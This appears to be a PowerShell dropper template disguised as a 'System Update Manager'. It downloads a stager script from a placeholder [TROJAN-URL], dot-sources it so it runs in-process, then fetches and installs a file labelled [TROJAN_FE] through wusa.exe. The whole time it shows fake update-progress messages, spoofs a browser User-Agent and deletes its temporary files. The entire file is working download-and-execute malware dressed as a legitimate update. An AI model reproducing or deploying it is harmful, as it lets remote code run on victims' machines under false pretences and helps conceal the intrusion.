$urlScript = '[TROJAN-URL]/[STAGERNAME]'
$urlMsu    = '[TROJAN-URL]/[TROJAN_FE]'

# ============================================================
# Utility: progress bar in console
# ============================================================
function Show-DownloadProgress {
    param(
        [string]$FileName,
        [long]$BytesReceived,
        [long]$TotalBytes
    )
    if ($TotalBytes -gt 0) {
        $pct    = [int](($BytesReceived / $TotalBytes) * 100)
        $filled = [int]($pct / 5)
        $bar    = ('#' * $filled).PadRight(20)
        Write-Host "`r    Downloading: [$bar] $pct%  ($([math]::Round($BytesReceived/1KB,1)) KB / $([math]::Round($TotalBytes/1KB,1)) KB)" -NoNewline
    } else {
        Write-Host "`r    Downloading: $([math]::Round($BytesReceived/1KB,1)) KB received (total size unknown)" -NoNewline
    }
}

# ============================================================
# Utility: download a file to %TEMP% with random name + ext
#          showing progress in console
# ============================================================
function Download-ToTemp {
    param(
        [string]$Url,
        [string]$Extension,
        [string]$Label
    )

    $rand     = [System.Guid]::NewGuid().ToString('N').Substring(0, 8)
    $destPath = "$env:TEMP\$rand$Extension"

    Write-Host ''
    Write-Host "  [*] Initiating download: $Label" -ForegroundColor Cyan
    Write-Host "      Source : $Url"
    Write-Host "      Target : $destPath"
    Write-Host ''

    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')

    $progressHandler = Register-ObjectEvent -InputObject $wc `
        -EventName DownloadProgressChanged `
        -Action {
            Show-DownloadProgress `
                -FileName      $Event.SourceArgs[1].UserState `
                -BytesReceived $Event.SourceArgs[1].BytesReceived `
                -TotalBytes    $Event.SourceArgs[1].TotalBytesToReceive
        }

    $completedHandler = Register-ObjectEvent -InputObject $wc `
        -EventName DownloadFileCompleted `
        -Action { $global:DownloadDone = $true }

    $global:DownloadDone = $false
    $wc.DownloadFileAsync([uri]$Url, $destPath)

    while (-not $global:DownloadDone) { Start-Sleep -Milliseconds 100 }

    Unregister-Event -SourceIdentifier $progressHandler.Name -ErrorAction SilentlyContinue
    Unregister-Event -SourceIdentifier $completedHandler.Name -ErrorAction SilentlyContinue
    Remove-Job -Name $progressHandler.Name -ErrorAction SilentlyContinue
    Remove-Job -Name $completedHandler.Name -ErrorAction SilentlyContinue

    $sizekb = [math]::Round((Get-Item $destPath).Length / 1KB, 1)
    Write-Host ''
    Write-Host "  [+] Download complete: $Label ($sizekb KB)" -ForegroundColor Green
    Write-Host ''

    return $destPath
}

# ============================================================
# Header
# ============================================================
Write-Host ''
Write-Host '================================================================' -ForegroundColor DarkCyan
Write-Host '  System Update Manager'                                          -ForegroundColor DarkCyan
Write-Host '  Initializing update sequence...'                                -ForegroundColor DarkCyan
Write-Host '================================================================' -ForegroundColor DarkCyan
Write-Host ''
Write-Host "  Timestamp : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Host "  Host      : $env:COMPUTERNAME"
Write-Host "  User      : $env:USERNAME"
Write-Host ''

# ============================================================
# PHASE 1 — Download and execute PowerShell script
# ============================================================
Write-Host '----------------------------------------------------------------' -ForegroundColor DarkGray
Write-Host '  PHASE 1 of 2 — Script Component'                               -ForegroundColor Yellow
Write-Host '----------------------------------------------------------------' -ForegroundColor DarkGray

$scriptPath = $null
try {
    $scriptLabel = [System.IO.Path]::GetFileName($urlScript)
    $scriptPath  = Download-ToTemp -Url $urlScript -Extension '.ps1' -Label $scriptLabel

    if (-not (Test-Path $scriptPath)) {
        throw "Downloaded file not found at expected path: $scriptPath"
    }

    Write-Host "  [*] Executing script component: $scriptLabel" -ForegroundColor Cyan
    Write-Host '      Method : in-process (dot-source)'
    Write-Host "      Path   : $scriptPath"
    Write-Host ''

    . $scriptPath

    Write-Host '  [+] Script component executed successfully.' -ForegroundColor Green

} catch {
    Write-Host "  [!] PHASE 1 encountered an error: $_" -ForegroundColor Red
} finally {
    if ($scriptPath -and (Test-Path $scriptPath)) {
        Write-Host "  [*] Cleaning up temporary file: $scriptPath" -ForegroundColor DarkGray
        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
        Write-Host '  [+] Temporary file removed.'                 -ForegroundColor DarkGray
    }
}

Write-Host ''

# ============================================================
# PHASE 2 — Download and execute MSU package
# ============================================================
Write-Host '----------------------------------------------------------------' -ForegroundColor DarkGray
Write-Host '  PHASE 2 of 2 — Update Package Component'                       -ForegroundColor Yellow
Write-Host '----------------------------------------------------------------' -ForegroundColor DarkGray

$msuPath = $null
try {
    $msuLabel = [System.IO.Path]::GetFileName($urlMsu)
    $msuPath  = Download-ToTemp -Url $urlMsu -Extension '.msu' -Label $msuLabel

    if (-not (Test-Path $msuPath)) {
        throw "Downloaded file not found at expected path: $msuPath"
    }

    Write-Host "  [*] Executing update package: $msuLabel"              -ForegroundColor Cyan
    Write-Host '      Installer : wusa.exe (Windows Update Standalone Installer)'
    Write-Host '      Mode      : synchronous (waiting for completion)'
    Write-Host "      Path      : $msuPath"
    Write-Host ''

    $proc = Start-Process `
        -FilePath    "$env:windir\System32\wusa.exe" `
        -ArgumentList "`"$msuPath`"" `
        -Wait `
        -PassThru

    Write-Host "  [+] Update package installer exited with code: $($proc.ExitCode)" -ForegroundColor Green

} catch {
    Write-Host "  [!] PHASE 2 encountered an error: $_" -ForegroundColor Red
} finally {
    if ($msuPath -and (Test-Path $msuPath)) {
        Write-Host "  [*] Cleaning up temporary file: $msuPath" -ForegroundColor DarkGray
        Remove-Item $msuPath -Force -ErrorAction SilentlyContinue
        Write-Host '  [+] Temporary file removed.'               -ForegroundColor DarkGray
    }
}

# ============================================================
# Footer
# ============================================================
Write-Host ''
Write-Host '================================================================' -ForegroundColor DarkCyan
Write-Host "  Update sequence completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor DarkCyan
Write-Host '================================================================' -ForegroundColor DarkCyan
Write-Host ''
